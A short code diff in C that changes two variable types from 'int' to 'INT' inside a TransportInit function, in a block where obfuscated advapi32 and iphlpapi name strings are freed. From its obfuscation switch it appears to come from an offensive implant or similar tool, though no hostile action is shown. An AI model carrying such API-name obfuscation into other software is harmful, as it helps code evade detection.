@@ -273,12 +273,12 @@ BOOL TransportInit( ) {
 
 #if CONFIG_OBFUSCATION == TRUE
     if(pwcAdvapi32 != NULL){
-        int lenWAdvapi32 = lstrlenW(pwcAdvapi32);
+        INT lenWAdvapi32 = lstrlenW(pwcAdvapi32);
         DATA_FREE(pwcAdvapi32,lenWAdvapi32)
     }
 
     if(pwcIphlpapi != NULL){
-        int lenWIphlpapi = lstrlenW(pwcIphlpapi);
+        INT lenWIphlpapi = lstrlenW(pwcIphlpapi);
         DATA_FREE(pwcIphlpapi,lenWIphlpapi)
     }
 
